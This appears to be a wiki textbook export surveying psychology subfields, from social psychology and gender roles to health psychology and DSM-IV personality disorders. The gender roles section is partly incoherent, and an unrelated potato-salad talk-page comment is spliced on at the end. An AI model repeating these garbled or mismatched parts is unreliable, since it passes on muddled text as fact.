Social psychologists typically explain human behavior as a result of the interaction of mental states and immediate, social situations. In general, social psychologists have a preference for laboratory based, empirical findings. Their theories tend to be specific and focused, rather than global and general.

Social psychologists have studied attitude formation, the structure of attitudes, attitude change, the function of attitudes, and the relationship between attitudes and behavior. Because people are influenced by the situation, general attitudes are not always good predictors of specific behavior. For a variety of reasons, a person may value the environment and not recycle a can on a particular day. Attitudes that are well remembered and central to our self-concept, however, are more likely to lead to behavior, and measures of general attitudes do predict patterns of behavior over time.

The topic of persuasion has received a great deal of attention in recent years. Persuasion is an active method of influence that attempts to guide people toward the adoption of an attitude, idea, or behavior by rational or emotive means. Persuasion relies on &quot;appeals&quot; rather than strong pressure or coercion. Numerous variables have been found to influence the persuasion process, and these are normally presented in four major categories: who said what to whom and how.

# The Communicator, including credibility, expertise, trustworthiness, and attractiveness.
# The Message, including varying degrees of reason, emotion (such as fear), one-sided or two sided arguments, and other types of informational content.
# The Audience, including a variety of demographics, personality traits, and preferences.
# The Channel, including the printed word, radio, television, the internet, or face-to-face interactions.

Dual process theories of persuasion (such as the Elaboration Likelihood Model) maintain that the persuasive process is mediated by two separate &quot;routes.&quot; Persuasion can be accomplished by either superficial aspects of the communication or the internal logic of the message. Whether someone is persuaded by a popular celebrity or factual arguments is largely determined by the ability and motivation of the audience. However, decades of research have demonstrated that deeply held attitudes are remarkably resistant to persuasion under normal circumstances.

Social cognition is a growing area of social psychology that studies how people perceive, think about, and remember information about others. One assumption in social cognition is that reality is too complex to easily discern, and so we see the world according to simplified schemas or images of reality. Schemas are generalized mental representations that organize knowledge and guide information processing. For example, one's schema for mice might include the expectation that they are small, and furry, and eat cheese.

Another major concept in social cognition is attribution. Attributions are the explanations we make for people's behavior, either our own behavior or the behavior of others. An attribution can be either internal or external. Internal or dispositional attributions assign causality to factors within the person, such as ability or personality. External or situational attributions assign causality to an outside factor, such as the weather. Numerous biases in the attribution process have been discovered:
* Fundamental attribution error - the tendency to make dispositional attributions for behavior. The actor-observer effect is a refinement of this bias, the tendency to make dispositional attributions for other people's behavior and situational attributions for our own.
* Just world effect- the tendency to blame victims (a dispositional attribution) for their suffering. This is believed to be motivated by people's anxiety that good people, including themselves, could be victimized in an unjust world.
* Self-serving bias - the tendency to take credit for successes, and blame others for failure. Researchers have found that depressed individuals often lack this bias and actually have more realistic perceptions of reality.

Heuristics are cognitive short cuts. Instead of weighing all the evidence when making a decision, people rely on heuristics to save time and energy. The availability heuristic occurs when people estimate the probability of an outcome based on how easy that outcome is to imagine. As such, vivid or highly memorable possibilities will be perceived as more likely than those that are harder to picture or are difficult to understand, resulting in a corresponding cognitive bias.

There are a number of other biases that have been found by social cognition researchers. The hindsight bias is a false memory of having predicted events, or an exaggeration of actual predictions, after becoming aware of the outcome. The confirmation bias is a type of bias leading to the tendency to search for, or interpret information in a way that confirms one's preconceptions.

The fields of social psychology and personality have merged over the years, and social psychologists have developed an interest in a variety of self-related phenomena. In contrast with traditional personality theory, however, social psychologists place a greater emphasis on cognitions than on traits. Much research focuses on the self-concept, which is a person's understanding of his or her self. The self-concept can be divided into a cognitive component, known as the self-schema, and an evaluative component, the self-esteem. The need to maintain a healthy self-esteem is recognized as a central human motivation in the field of social psychology. Self-efficacy beliefs are an aspect of the self-schema. Self-efficacy refers to an individual's expectation that performance on some task will be effective and successful.

People develop their self-concepts by a variety of means, including introspection, feedback from others, self-perception, and social comparison. By comparison to relevant others, people gain information about themselves, and they make inferences that are relevant to self-esteem. Social comparisons can be either upward or downward, that is, comparisons to people who are either higher in status or ability, or lower in status or ability. Downward comparisons are often made in order to elevate self-esteem.

Self-perception is a specialized form of attribution that involves making inferences about oneself after observing one's own behavior. Psychologists have found that too many extrinsic rewards (e.g. money) tend to reduce intrinsic motivation through the self-perception process. People's attention is directed to the reward and they lose interest in the task when the reward is no longer offered. This is an important exception to reinforcement theory.

An example of cognitive dissonance is smoking. Smoking cigarettes increases the risk of cancer, which is threatening to the self-concept of the individual who smokes. Most of us believe ourselves to be intelligent and rational, and the idea of doing something foolish and self-destructive causes dissonance. To reduce this uncomfortable tension, smokers tend to make excuses for themselves, such as &quot;I'm going to die anyway, so it doesn't matter.&quot;

Social influence refers to the way people affect the thoughts, feelings, and behaviors of others. Like the study of attitudes, it is a traditional, core topic in social psychology. In fact, research on social influence overlaps considerably with research on attitudes and persuasion. Social influence is also closely related to the study of group dynamics, as most of the principles of influence are strongest when they take place in social groups.

Conformity is the most common and pervasive form of social influence. It is generally defined as the tendency to act or think like other members of a group. Group size, unanimity, cohesion, status, and prior commitment all help to determine the level of conformity in an individual. Conformity is usually viewed as a negative tendency in American culture, but a certain amount of conformity is not only necessary and normal, but probably essential for a community to function.

The two major motives in conformity are: 1) normative influence, the tendency to conform in order to gain social acceptance, and avoid social rejection or conflict, as in peer pressure; and 2) informational influence, which is based on the desire to obtain useful information through conformity, and thereby achieve a correct or appropriate result. Minority influence is the degree to which a smaller faction within the group influences the group during decision making. Note that this refers to a minority position on some issue, not an ethnic minority. Their influence is primarily informational and depends on consistent adherence to a position, degree of defection from the majority, and the status and self-confidence of the minority members. Reactance is a tendency to assert oneself by doing the opposite of what is expected. This phenomenon is also known as anticonformity and it appears to be more common in men than in women.

A different kind of social influence is the self-fulfilling prophecy. This is a prediction that, in being made, actually causes itself to become true. For example, in the stock market, if it is widely believed that a crash is imminent, investors may lose confidence, sell most of their stock, and actually cause the crash. Likewise, people may expect hostility in others and actually induce this hosility by their own behavior.

A group is two or more people that interact, influence each other, and share a common identity. Groups have a number of emergent qualities that distinguish them from aggregates:

* Norms - implicit rules and expectations for group members to follow, e.g. saying thank you, shaking hands.
* Roles - implicit rules and expectations for specific members within the group, e.g. the oldest sibling, who may have additional responsibilities in the family.
* Relations - patterns of liking within the group, and also differences in prestige or status, e.g. leaders, popular people.

Temporary groups and aggregates share few or none of these features, and do not qualify as true social groups. People waiting in line to get on a bus, for example, do not constitute a group.

Groups also affect performance and productivity. Social facilitation, for example, is a tendency to work harder and faster in the presence of others. Social facilitation increases the likelihood of the dominant response, which tends to improve performance on simple tasks and reduce it on complex tasks. In contrast, social loafing is the tendency of individuals to slack when working in a group. Social loafing is common when the task is considered unimportant and individual contributions are not easy to see.

Social psychologists study a variety of group related, or collective phenomena such as the behavior of crowds. An important concept in this area is deindividuation, a reduced state of self-awareness that can be caused by feelings of anonymity. Deindividuation is associated with uninhibited and sometimes dangerous behavior. It is common in crowds and mobs, but it can also be caused by a disguise, a uniform, alcohol, dark environments, or online anonymity.

===&lt;center&gt;Gender Roles&lt;/center&gt; ===
The process through which the individual learns and accepts roles is called socialization. Socialization works by encouraging wanted and discouraging unwanted behavior. These sanctions by agencies of socialization such as the family, schools, and the communication medium (The Media) make it clear to the child what behavioral norms the child is expected to follow. The examples of the child's parents, siblings and teachers are typically followed. Mostly, accepted behavior is not produced by outright reforming coercion from an accepted social system. In some other cases, various forms of coercion has been used to acquire a desired response or function. In majority of the traditional and developmental social systems, an individual has a choice to what should he or she extent as a conformed representative of a socialization process. In this voluntary process, the consequences can be beneficial or malfunctional, minor or severe for every case by a behavior's socialization influence forming gender roles or expectations institutionalizing gender differences. Typical encouragements and expectations of gender role behavior are not as a powerful difference and reforming social trait to a century ago. Such developments and traditional refineries are still a socialization process to and within family values, peer pressures, at the employment centers and in every social system communication medium (the media).

Still, once someone has accepted certain gender roles and gender differences as an expected socialized behavioral norms, these behavior traits become part of the individual's responsibilities not influential roles in gender relationships on a personal and social levels to the individual's own socializing role or self (identity). Sanctions to unwanted behavior and role conflict can be stressful.

It is observed that even in monolingual, industrial societies like urban North America, some individuals do cling to a &quot;modernized&quot; primordial identity, apart from others and with this a more diverse gender role is recognitized or developed. Some intellectuals, such as Michael Ignatieff, argue that convergence of a general culture does not directly entail a similar convergence in ethnic, social and self identities. This can become evident in social situations, where people divide into separate groups by gender roles and cultural alignments, despite being of an identical &quot;super-ethnicity&quot;, such as nationality.

Within each smaller ethnicity, individuals may tend to see it perfectly justified to assimilate with other cultures including sexuality and some others view assimilation as wrong and incorrect for their culture or institution. This common theme, representing dualist opinions of ethnoconvergence itself, within a single ethnic or common values groups is often manifested in issues of sexual partners and matrimony, employment preferences, etc. These varied opinions of ethnoconvergence represent themselves in a spectrum; assimilation, homogenization, acculturation, gender identities and cultural compromise are commonly used terms for ethnoconvegence which flavor the issues to a bias.

Often it's in a secular, multi-ethnic environment that cultural concerns are both minimalised and exacerbated; Ethnic prides are boasted, hierarchy is created (&quot;center&quot; culture versus &quot;periphery&quot;) but on the other hand, they will still share a common &quot;culture&quot;, and common language and behaviours. Often the elderly, more conservative-in-association of a clan, tend to reject cross-cultural associations, and participate in ethnically similar community-oriented activities. Xenophobes tend to think of cross-cultural contact as a component of gender and assimilation and see this as harmful.

Gender roles have long been a staple of the Nature/Nurture debate: Traditional theories of gender usually assume that one's gender identity, and hence one's gender role, is a natural given. For example, it is often claimed in Western and other societies that women are naturally more fit to look after children. The idea that differences in gender roles originate in differences in biology has found support in parts of the scientific community. 19th-century anthropology sometimes used descriptions of the imagined life of paleolithic hunter-gatherer societies for evolutionary explanations for gender differences. For example, those accounts maintain that the need to take care of offspring may have limited the females' freedom to hunt and assume positions of power.

More recently, sociobiology and evolutionary psychology have explained those differences in social roles by treating them as adaptations. This approach, too, is considered controversial.

A person's gender role is composed of several elements and can be expressed through clothing, behaviour, choice of work, personal relationships and other factors. These elements are not concrete and have evolved through time (for example women's trousers).

Gender roles were traditionally divided into strictly feminine and masculine gender roles, though these roles have diversified today into many different acceptable male or female gender roles. However, gender role norms for women and men can vary significantly from one country or culture to another, even within a country or culture. People express their gender role somewhat uniquely.

Gender role can vary according to the social group to which a person belongs or the subculture with which he or she identifies cultural identity. Historically, for example, eunuchs had a different gender role because their biology was changed.

In many other cases, the elements of convention or tradition seem to play a dominant role in deciding which occupations fit in with which gender roles. In the United States, physicians have traditionally been men, and the few people who defied that expectation received a special job description: &quot;woman doctor&quot;. Similarly, there are special terms like &quot;male nurse&quot;, &quot;woman lawyer&quot;, &quot;lady barber&quot;, &quot;male secretary,&quot; etc. But in China and the former Soviet Union countries, medical doctors are predominantly women, and in the United Kingdom, Germany and Taiwan it is very common for all of the barbers in a barber shop to be women. Also, throughout history, some jobs that have been typically male or female have switched genders. For example, clerical jobs. Clerical jobs used to be considered a man's job, but when several women began filling men's job positions due to World War II, clerical jobs quickly became dominated by women. It became more feminized, and women workers became known as &quot;typewriters&quot; or &quot;secretaries&quot;. There are many other jobs that have switched gender roles, and many jobs are continually evolving as far as being dominated by women or men.

Most feminists argue that traditional gender roles are oppressive for women. They assume that the female gender role was constructed as an opposite to an ideal male role, and helps to perpetuate patriarchy.

For approximately the last 100 years women have been fighting for the same rights as men (especially in the 1960's with second-wave feminism and radical feminism) and were able to make changes to the traditionally accepted feminine gender role. However, most feminists today say there is still work to be done.

===&lt;center&gt;Cognitive Psychology&lt;/center&gt;===
Cognitive Psychology is the school of psychology that examines internal mental processes such as problem solving, memory, and language. It had its foundations in the Gestalt psychology of Max Wertheimer, Wolfgang Köhler, and Kurt Koffka, and in the work of Jean Piaget, who studied intellectual development in children. Cognitive psychologists are interested in how people understand, diagnose, and solve problems, concerning themselves with the mental processes which mediate between stimulus and response. Cognitive theory contends that solutions to problems take the form of algorithms—rules that are not necessarily understood but promise a solution, or heuristics—rules that are understood but that do not always guarantee solutions. In other instances, solutions may be found through insight, a sudden awareness of relationships.

Cognitive psychology is one of the more recent additions to psychological research, having only developed as a separate area within the discipline since the late 1950s and early 1960s (though there are examples of cognitive thinking from earlier researchers). The cognitive approach was brought to prominence by Donald Broadbent's book Perception and Communication in 1958. Since that time, the dominant paradigm in the area has been the information processing model of cognition that Broadbent put forward. This is a way of thinking and reasoning about mental processes, envisaging them as software running on the computer that is the brain. Theories commonly refer to forms of input, representation, computation or processing, and outputs. Applied to language as the primary mental knowledge representation system, cognitive psychology has exploited tree and network mental models. Its singular contribution to AI and psychology in general is the notion of a semantic network. One of the first cognitive psychologists, George Miller is well-known for dedicating his career to the development of WordNet, a semantic network for the English language. Development began in 1985 and is now the foundation for many machine ontologies.

This way of conceiving mental processes has pervaded psychology more generally over the past few decades, and it is not uncommon to find cognitive theories within social psychology, personality, abnormal psychology, and developmental psychology; the application of cognitive theories to comparative psychology has driven many recent studies in animal cognition.

The information processing approach to cognitive functioning is currently being questioned by new approaches in psychology, such as dynamical systems, and the embodiment perspective.

Because of the use of computational metaphors and terminology, cognitive psychology was able to benefit greatly from the flourishing of research in artificial intelligence and other related areas in the 1960s and 1970s. In fact, it developed as one of the significant aspects of the inter-disciplinary subject of cognitive science, which attempts to integrate a range of approaches in research on the mind and mental processes.

===&lt;center&gt;Critical Psychology&lt;/center&gt;===
Critical psychology is a branch of psychology that is aimed at critiquing mainstream psychology and attempts to apply psychology in more progressive ways, often looking towards social change as a means of preventing and treating psychopathology. One of Critical Psychology's main criticisms of conventional psychology is how it fails to consider or deliberately ignores the way power differences between social classes and groups can impact the mental and physical well-being of individuals or groups of people.

One of the most important books in the field is the Grundlegung der Psychologie (Foundations of Psychology) by Klaus Holzkamp, who might be considered the theoretical founder of critical psychology. Holzkamp incorporated ideas from Freud´s psychoanalysis and Merleau-Ponty´s phenomenology into his approach. The appeal of critical psychology to socialists is that it is an attempt to come to grips with the social and the historical &quot;conditionality&quot; of human beings. His last major publication before his death in 1995 appeared in 1993 and contained a phenomenological theory of learning from the standpoint of the subject, as well as an extensive analysis on the modern state´s institutionalized forms of &quot;classroom learning&quot; as the cultural-historical context that shapes much of modern learning and sozialization. In this analysis, he heavily drew upon Michel Foucault's Discipline and Punish; in his learning theory, he was inspired by social anthropologists Jean Lave (situated learning) and Edwin Hutchins (distributed cognition).

In the 1960s and 1970s the term radical psychology was used by psychologists to denote a branch of the field which rejected conventional psychology's focus on the individual as the basic unit of analysis and sole source of psychopathology. Instead, radical psychologists examined the role of society in causing and treating problems, and looked towards social change as an alternative to therapy to treat mental illness and as a means of preventing psychopathology. Within psychiatry the term anti-psychiatry was often used and now British activists prefer the term critical psychiatry. Critical Psychology is currently the preferred term for the discipline of psychology keen to find alternatives to the way the discipline of psychology reduces human experience to the level of the individual and thereby strips away possibilities for radical social change.

Starting in the 1990s a new wave of books started to appear on critical psychology, the most influential being the edited book Critical Psychnology by Dennis Fox and Isaac Prilleltensky. Various introductory texts to critical psychology written in the United Kingdom have tended to focus on discourse, but this has been seen by some proponents of critical psychology as a reduction of human experience to language which is as politically dangerous as the way mainstream psychology reduces experience to the individual mind.

There are a now international journals devoted to critical psychology, including the International Journal for Critical Psychology and the Annual Review of Critical Psychology. The journals still tend to be directed to an academic audience, though the Annual Review of Critical Psychology runs as a open-access online journal. There are close links between critical psychologists and critical psychiatrists in Britain through the Asylum Collective. Critical psychology courses and research concentrations are available at Manchester Metropolitan University, Cardiff University, the University of the West of England in Bristol, the University of East London and the University of Adelaide.

One of the criticisms of conventional psychology raised by critical psychology is the inattention to power differentials between different groups - examples include between psychiatrists and patients, wealthy groups and the less financially well-off, or industrial lobbyists and the general public. This inattention to power has resulted in conventional psychology tending to assume that how things are is how they should be, that the current state of affairs is the natural state of things. As a result, conventional psychology has a tendency to uphold the status quo, victim-blame and situate problems within individuals rather than the social context they are embedded in.

Like many critical applications, critical psychology has expanded beyond Marxist roots to benefit from other critical approaches. Consider ecopsychology and transpersonal psychology. Critical psychology and related work has also sometimes been labelled radical psychology and liberation psychology. In the field of developmental psychology, the work of Erica Burman has been influential.

Various sub-disciplines within psychology have begun to establish their own critical orientations.

Critical psychology in the United States and Canada has, for the most part, focused on critiques of mainstream psychology's support for an unjust status quo. No departments of critical psychology exist, though critical perspectives are sometimes encountered in traditional universities, perhaps especially within community psychology programs. North American efforts include the 1993 founding of RadPsyNet Radical Psychology Network, the 1997 publication of Critical Psychology: An Introduction (edited by Dennis Fox and Isaac Prilleltensky), and the action-focused PsyACT (Psychologists Acting with Conscience Together).

The University of KwaZulu-Natal in Durban, South Africa, is one of few worldwide to offer a masters course in critical psychology. For an overview of critical psychology in South Africa, see Desmond Painter and Martin Terre Blanche's article on Critical Psychology in South Africa: Looking back and looking forwards. They have also now started a critical psychology blog.

=== &lt;center&gt;Community Psychology&lt;/center&gt; ===
Community Psychology makes use of various perspectives within and outside of Psychology to address issues of communities, the relationships within them, and people's attitudes about them. Through collaborative research and action, community psychologists (practitioners and researchers) seek to understand and to enhance quality of life for individuals, communities, and society. Community psychology takes a public health approach and focuses on prevention and early intervention as a means to solve problems in addition to treatment. Closely related disciplines include Social Psychology, Political Science, and Community development.

Community Psychology found a proposed &quot;conceptual center&quot; in the idea of Psychological Sense of Community (or simply Sense of Community), introduced in 1974 by Seymour Sarason. In 1986 a major step was taken by theoretician David McMillan and operationalizer David Chavis with the publication of their Theory of Sense of Community and Sense of Community Index. Originally designed primarily in reference to neighborhoods, the Sense of Community Index (SCI) can be adapted to study other communities as well, including the workplace, schools, religious communities, communities of interest, etc.

=== &lt;center&gt;Health Psychology&lt;/center&gt; ===
Many researchers believe that physical health may be influenced by psychology through a variety of direct and indirect means. There is some evidence that certain negative mental states (such as depression and anxiety) can directly affect physical immunity through production of stress hormones, such as the catecholamines and glucocorticoids. Although this research is widely debated, there is also some indication that negative psychological states may lead to faster disease progression in certain diseases (such as HIV and heart disease) through these direct biological mechanisms. Negative emotional states may also indirectly affect disease processes through their influence on health behaviors. For example, depression has been related to many risk factors for poor health including overeating, smoking, physical inactivity, and poor medication compliance.

* Clinical health psychology (ClHP) adopts a definition reflecting the fact that the field was originally a branch of clinical psychology; it is also a major contributor to the field of behavioral medicine within psychiatry. Clinical practice includes the techniques of education, behavioral change, and psychotherapy; with additional training, a clinical health psychologist can become a medical psychologist in certain countries and, consequently, prescribe medication.
* Organizational health psychology (OHP) is the use of health psychology knowledge and techniques as applied to health and illness in the workplace, at the individual and group levels.
* Public health psychology (PHP) tries to determine causation between psychological factors and health for the population as a whole, and present this information to educators, policy makers, and health care practitioners for the promotion of better public health. It gives prominence to population-level health outcomes and interventions. It is allied to other disciplines in the fields of global and public health including epidemiology, nutrition, genetics and statistics. Interventions are determined and &quot;targeted&quot; using population health statistics which evaluate health needs of various population groups as perceived by health authorities and policy makers. These interventions are &quot;top-down&quot; and tend to have varying levels of effectiveness across diverse population groups.
* Community health psychology (CoHP) approach tries to understand what is happening at a local level. Interventions are generated collaboratively with coalitions of stakeholders and are aimed to facilitate community empowerment to improve the physical and/or mental health of local people outside of any formal involvement of the health care system.
* Critical health psychology (CrHP) is concerned with the distribution of power and the impact of power differentials on health experience and behaviour, health care systems and health policy. It prioritises social justice and the universal right to health of peoples of all races, genders, ages, and socioeconomic positions. A major concern is health inequalities. The CrHPist is an agent of change, not simply an analyst or cataloguer. The field was developed through the foundation of the Journal of Health Psychology and the International Society of Critical Health Psychology.

Health psychology is both a theoretical and applied field. Many different methods are employed including questionnaires, interviews, controlled studies, and actions designed to bring about change using &quot;action research&quot;. Health psychologists conduct health interviews with clients that aim to construct a more holistic picture of each person’s health, one that includes their genes, religious beliefs, social supports, living conditions, emotional state, and beliefs of health, etc. They use this information to work alongside a person’s physicians and therapists to develop a treatment tailored for individual needs or to develop greater empowerment among the community's members so that the community is able to strengthen and sustain its own quality of life.

Health psychologists seek to identify the behaviors and experiences that promote health, lead to illness, influence the effectiveness of health care, and recommend improvements to health policy in their light. There are many examples of this. Smoking, diet, and regular exercise all contribute to the formation of disease. There are some minor associations between illness and individual characteristics such as personality. For example, it is claimed that individuals with thrill seeking personalities are more likely to drive fast, making them more likely to injure themselves in car accidents. And also that people distrustful of physicians will not get regular checkups. However there are contextual factors in the form of political, economic, cultural, community, social and lifestyle factors that have a more major influence on the health of particular individulas, although they will not generally recognise these.

Factors that lead to the behaviors that cause illness are of interest because they help psychologists to predict who is most susceptible to illness and why. There are many contributing factors that help determine our behaviors, and all of the dimensions of the biopsychosocial model can be applied to understand these interconnectons. Biologically, physical addiction plays an important role in smoking cessation. As does the psychological dependency on tobacco brought about largely by seductive advertising and other forms of tobacco promotion. Psychologically, people with high stress jobs are more likely to develop cardiovascular disease. Socially, people with low incomes have less access to health resources and screening processes. They also are exposed to greater environmental toxigens, lower levels of education, poorer housing, less healthy foods, higher smoking prevalence, and many other toxic socially determined living conditions.

Health psychologists also aim to change health behaviors for the dual purpose of helping people stay healthy and helping patients adhere to disease treatment regimens. Cognitive behavioral therapy and behavior modification are techniques often used for this purpose.

Psychologists work towards promoting health through behavioral change, as mentioned above, but they prevent illness in other ways as well. Practitioners emphasize education as a large part of illness prevention, as many people do not recognize the risk to illness present in their lives. Or they are unable to implement the knowledge that they have owing to the pressures of their everyday existence. A common example of this is anti-smoking campaigns. Those least able to afford tobacco products consume them the most. It is a method for controlling emotional states, the daily experiences of stress that characterize the lives of deprived and vulnerable people.

There is much to know about how disease affects our mental well being. When illness or accidents befall a person, their entire life is affected. A psychologically healthy individual who gets severely injured, say, now has many different practical issues to contend with that will in turn affect their psychological wellbeing. Who will take care of them while they recover? If they can’t work, how will they pay for bills or care for dependents? If this person sees themselves as being self-reliant, how do they handle this new identity? What if they cannot pursue their usual hobbies and interests? All of these possibilities can affect a person’s relationships, self-esteem, stress level, happiness and belief system. Many of these issues are economic and social in nature rather than psychological but they have a direct impact on psychological wellbeing.

This important field of study considers how those with terminal illnesses can lead a better life. When there is little hope of recovery, health psychology therapists can improve the quality of life of the patient by helping them recover their mental well-being.

Critical health psychologists are exploring how health policy can impact on inequities, inequalities and social injustice. This expands the scope of health psychology beyond the level of individual health to an examination of the social and economic determinants of health experience both within and between regions and nations.

Health psychologists attempt to aid the process of communication between doctors and patients during medical consultations. There are many problems in this process, particularly the use of jargon by doctors (using long, complex, usually medicine-specific words often not understood by the patient). Researchers such as Boyle and McKinlay have investigated this process and discovered not only that patient understanding is low (40% of women on a maternity ward understood 13 medical terms that they were given), but that even doctors do not expect their patients to understand their jargon! One main area of research on this topic involves 'doctor centred' or 'patient centred' consultations. Doctor centred consultations are generally directive, with the patient answering questions and taking little part in decision-making. Although this style is preferred by elderly people and others, many people dislike the sense of hierarchy or ignorance that it inspires.

Getting people to obey medical advice and adhere to their treatment regimens is a difficult task for health psychologists. Mostly, people forget to take their pills or find their side effects too difficult to cope with (rational non-adherence), but failing to take prescribed medication costs the Health Service millions of pounds per year, as well as wasting millions of usable, viable medicines that could otherwise be used to help other people.

=== &lt;center&gt;Positive Psychology &lt;/center&gt;===
Positive psychology is the scientific study of optimal human functioning.

Psychology has been criticized as primarily dedicated to addressing mental illness rather than mental &quot;wellness&quot;. Several humanistic psychologists—such as Abraham Maslow, Carl Rogers, and Erich Fromm—developed successful theories and practices that involved human happiness despite there being a lack of solid empirical evidence behind their work.

Current empirical researchers in this subfield include Donald Clifton, Albert Bandura, Martin Seligman, Ed Diener, Mihaly Csikszentmihalyi, C.R. Snyder, Christopher Peterson, Shelley Taylor, Barbara Fredrickson, Charles S. Carver, Michael F. Scheier.

Some researchers in this field posit that positive psychology can be delineated into three overlapping areas of research:

#Research into the Pleasant Life or the &quot;life of enjoyment&quot; examines how people optimally experience, forecast, and savor the positive feelings and emotions that are part of normal and healthy living (e.g. relationships, hobbies, interests, entertainment, etc.).
#The study of the Good Life or the &quot;life of engagement&quot; investigates the beneficial affects of immersion, absorption, and flow that individuals feel when optimally engaged with their primary activities. These states are experienced when there is a positive match between a person's strength and the task they are doing, i.e. when they feel confident that they can accomplish the tasks they face.
#Inquiry into the Meaningful Life or &quot;life of affiliation&quot; questions how individuals derive a positive sense of well-being, belonging, meaning, and purpose from being part of and contributing back to something larger and more permanent than themselves (e.g. nature, social groups, organizations, movements, traditions, belief systems).

The development of the Character Strengths and Virtues (CSV) handbook represents the first attempt on the part of the research community to identify and classify the positive psychological traits of human beings. Much like the Diagnostic and Statistical Manual of Mental Disorders (DSM) of general psychology, the CSV provides a theoretical framework to assist in developing practical applications for positive psychology. This manual identifies six classes of virtue (i.e. &quot;core virtues&quot;), made up of twenty-four measurable character strengths.

The organization of these virtues and strengths is as follows:
# Wisdom and Knowledge: creativity, curiosity, open-mindedness, love of learning, perspective
# Courage: bravery, persistence, integrity, vitality
# Humanity: love, kindness, social intelligence
# Justice: citizenship, fairness, leadership
# Temperance: forgiveness and mercy, humility and modesty, prudence, self-regulation
# Transcendence: appreciation of beauty and excellence, gratitude, hope, humor, spirituality

Practical applications of positive psychology include helping individuals and organizations correctly identify their strengths and use them to increase and sustain their respective levels of well-being. Therapists, counselors, coaches, and various other psychological professionals can use the new methods and techniques to build and broaden the lives of individuals who are not necessarily suffering from mental illness or disorder.

===&lt;center&gt;Medical Psychology&lt;/center&gt;===
Medical psychology (related to Clinical Health Psychology, Psychosomatic Medicine, and Behavioral Medicine') is a branch of clinical psychology where clinicians have trained in the biological aspects of mental illness in relation to physical illness, and are usually qualified to prescribe medication; this last aspect varies from country to country. It adopts the biopsychosocial approach to medicine, which revolves around the idea that both the body and mind are indivisible, and that disease and illness are not identical. Continuing with this line of thought, all diseases whether of the mind or of the physical body must be treated as if they have both been affected. The intent of Medical Psychology is to apply knowledge from all branches of social, psychological, and biological medicine in the prevention, assessment, and treatment of all forms of physical illness and the adaptation to illness; specific behavioral, psychotherapeutic, and pharmaceutical methods are used to help the person respond to illness and prevent further illness through matching coping and management skills to the person’s abilities, character, and personality style.

Some clinical practitioners and philosophers today believe that this Cartesian line of thought is outdated. Some anecdotal evidence has been raised concerning the lack of effective treatment for things such as migraines, pains and cancer and that perhaps the cure should not only be centred on the body but also the mind. Some also raise the argument that most uncurable diseases are brought about not merely by physical ailments, but by mental problems. All evidence is of course unproven and will likely remain as such for a long time to come.

The contribution of medical psychologists to general health care increased with their use as primary care doctors in the world's largest HMO, the California Kaiser Permanente. These psychologists work along with primary care physicians in order to determine optimum treatment plans for all patients with physical and/or mental illnesses.

An important contribution of medical psychology is in the education of patients (psychoeducation) in disease processes. Frequently, such education of the patient and the family insures substantially better adherence to treatment recommendations. Medical psychologists are particularly successful in the treatment of asthma, gastrointestinal illnesses, cardiac conditions, spinal cord and brain injuries, chronic pain, headaches, and addictions (drugs, smoking, eating, alcohol, etc.).

Training in medical psychology entails a doctoral degree (Ph.D., or Psy.D.) in clinical psychology, an internship, and postdoctoral training in one of the branches of medicine traditionally associated with psychological fields: psychosomatic medicine, rehabilitation, neuropsychology (central nervous system functioning - brain functions), substance abuse, pain medicine, among others.

===&lt;center&gt;Personality Disorders&lt;/center&gt;===
Personality disorders form a class of mental disorders that are characterized by long-lasting rigid patterns of thought and actions. Because of the inflexibility and pervasiveness of these patterns, they can cause serious problems and impairment of functioning for the persons who are afflicted with these disorders.

Personality disorders are seen by the American Psychiatric Association as an enduring pattern of inner experience and behavior that deviates markedly from the expectations of the culture of the individual who exhibits it. These patterns are inflexible and pervasive across many situations. The onset of the pattern can be traced back at least to the beginning of adulthood. To be diagnosed as a personality disorder, a behavioral pattern must cause significant distress or impairment in personal, social, and/or occupational situations.

Personality disorders are noted on Axis II of the diagnostic manual of the American Psychiatric Association, the Diagnostic and Statistical Manual of Mental Disorders (DSM, or DSM-IV-TR as it is currently in its fourth edition with a text revision). (Note: Mental Retardation is also noted on Axis II).

General diagnostic criteria for a personality disorder:

To make a diagnosis of a personality disorder, these criteria must be satisfied in addition to the specific criteria listed under the individually named personality disorders.

* Experience and behavior that deviates markedly from the expectations of the individual's culture. This pattern is manifested in two (or more) of the following areas:
**cognition (perception and interpretation of self, others and events)
**affect (the range, intensity, lability, and appropriateness of emotional response)
**interpersonal functioning
**impulse control
* The enduring pattern is inflexible and pervasive across a broad range of personal and social situations.
* The enduring pattern leads to clinically significant distress or impairment in social, occupational, or other important areas of functioning.
* The pattern is stable and of long duration and its onset can be traced back at least to adolescence or early adulthood.
* The enduring pattern is not better accounted for as a manifestation or consequence of another mental disorder.
* The enduring pattern is not due to the direct physiological effects of a substance or a general medical condition such as head injury.

People under 18 years old who fit the criteria of a personality disorder are usually not diagnosed with such a disorder, although they may be diagnosed with a related disorder. Antisocial personality disorder cannot be diagnosed at all in persons under 18.
The DSM-IV lists ten personality disorders, which are grouped into three clusters:

Cluster A (odd or eccentric disorders)
* Paranoid personality disorder
* Schizoid personality disorder
* Schizotypal personality disorder
Cluster B (dramatic, emotional, or erratic disorders)
* Antisocial personality disorder
* Borderline personality disorder
* Histrionic personality disorder
* Narcissistic personality disorder
Cluster C (anxious or fearful disorders)
* Avoidant personality disorder
* Dependent personality disorder (not the same as Dysthymia)
* Obsessive-compulsive personality disorder (not the same as Obsessive-compulsive disorder)

The DSM-IV also contains a category for behavioural patterns that do not match these ten disorders, but nevertheless have the characteristics of a personality disorder; this category is labeled Personality Disorder NOS (Not Otherwise Specified). The revision of the previous edition of the DSM, DSM-III-R, also contained the Passive-Aggressive Personality Disorder, the Self-Defeating Personality Disorder, and the Sadistic Personality Disorder. Passive-Aggressive Personality Disorder is a pattern of negative attitudes and passive resistance in interpersonal situations. Self-defeating personality disorder is characterised by behaviour that consequently undermines the person's pleasure and goals. Sadistic Personality Disorder is a pervasive pattern of cruel, demeaning, and aggressive behavior. These categories were removed in the current version of the DSM, because it is questionable whether these are separate disorders. Passive-Aggressive Personality Disorder and Depressive personality disorder were placed in an appendix of DSM-IV for research purposes.

There are not only personality issues that are raised in psychology there are also factors of mental health that should be treated with causion that of depression, schizophrenia, to name but a few.

      <text xml:space="preserve">== My kind of potato salad! ==
This is more like my potato salad than any of the other wiki versions. But the proportions are a little different, and the pickle juice bit bothers me. 1/4 what? 1/4 teaspoon? 1/4 cup? 1/4 bottle? And do you use only the juice and no pickles? I put plenty of sweet pickles in my potato salad, along with some juice. I want to come back to this when I have time to tinker with the recipe. [[User:Nyanna|Nyanna]] 16:33, 17 March 2007 (UTC)

